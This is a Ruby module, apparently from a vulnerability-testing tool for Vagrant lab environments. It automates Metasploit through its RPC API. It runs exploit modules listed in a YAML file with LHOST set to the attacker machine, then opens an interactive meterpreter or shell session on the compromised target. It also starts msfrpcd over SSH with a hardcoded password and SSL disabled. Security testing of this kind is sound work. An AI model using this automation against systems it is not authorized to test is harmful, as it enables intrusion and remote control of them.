require_relative './tools/msf'
require_relative '../utility'

module Exploit

  def exploit(attack_machine_host, attack_config_path)
    @msf_api = MetasploitAPI.new(attack_machine_host)
    @msf_api.auth_login
    @msf_api.console_create

    # Lead yaml file
    msf_module_config = YAML.load_file(attack_config_path)
    msf_modules = msf_module_config['metasploit_module']

    Utility.print_message('execute', 'exploit attack')

    msf_modules.each do |msf_module|
      msf_module_type = msf_module['module_type']
      msf_module_name = msf_module['module_name']

      options = msf_module['options']
      msf_module_option = {}
      options.each do |option|
        msf_module_option[option['name']] = option['var']
      end

      msf_module_option['LHOST'] = attack_machine_host
      msf_module_info = @msf_api.module_execute(msf_module_type, msf_module_name, msf_module_option)

      exploit_time = 0
      session_connection_flag = false

      Utility.tty_spinner_begin(msf_module['module_name'])
      loop do
        sleep(1)
        msf_session_list = @msf_api.module_session_list
        msf_session_list.each do |session_info_key, session_info_value|
          session_connection_flag = true if msf_module_info['uuid'] == session_info_value['exploit_uuid']
        end
        break if exploit_time > 600 || session_connection_flag
        exploit_time += 1
      end
      session_connection_flag ? Utility.tty_spinner_end('success') : Utility.tty_spinner_end('error')
    end
  end

  def verify
    Utility.print_message('execute', 'execute verify')
    Utility.print_message('execute', 'Brake into target machine')

    # Use meterpreter by metasploit
    session_type = nil
    session_id = nil
    @msf_api.module_session_list.each do |session_info_key, session_info_value|
      session_id = session_info_key if session_info_value['type'] == 'meterpreter' || session_info_value['type'] == 'shell'
      session_type = session_info_value['type'] unless session_id.nil?
    end
    return if session_id.nil?

    loop do
      print "#{session_type} > "
      input_command_list = gets.chomp.split(" ")
      input_command = input_command_list[0]

      # When input next line
      next if input_command.nil?
      break if input_command == 'exit'

      if session_type == 'meterpreter'
        @msf_api.meterpreter_write(session_id, input_command)
      elsif session_type == 'shell'
        @msf_api.shell_write(session_id, input_command)
      end

      loop do
        sleep(1)
        res = {}
        if session_type == 'meterpreter'
          res = @msf_api.meterpreter_read(session_id)
        elsif session_type == 'shell'
          res = @msf_api.shell_read(session_id)
        end
        unless res['data'].empty?
          puts res['data']
          break
        end
      end
    end
  end

  def prepare(attacker, vultestkey, vulenv_config_path)
    vulenv_config_detail = YAML.load_file(vulenv_config_path)

    if vulenv_config_detail.key?('caution')
      vulenv_config_detail['caution'].each do |env_caution|
        if env_caution['type'] == 'start-up'
          Utility.print_message('caution', 'following execute command')
          Utility.print_message('defalut', '  [1] cd ./test')
          Utility.print_message('default', '  [2] vagrant ssh')
          code_procedure = 3
          env_caution['msg'].each do |msg|
            msg = "  [#{code_procedure}] #{msg}"
            Utility.print_message('default', msg)
            code_procedure += 1
          end
        end
      end
    end

    Dir.chdir('.') do
      Utility.tty_spinner_begin('metasploit server')
      stdout, stderr, status = Open3.capture3("ssh -i #{vultestkey} root@#{attacker} msfrpcd -a #{attacker} -p 55553 -U msf -P metasploit -S false")

      if status.exitstatus != 0
        Utility.tty_spinner_end('error')
        return 'error'
      end
      Utility.tty_spinner_end('success')
    end
  end

  module_function :exploit
  module_function :prepare
  module_function :verify

end
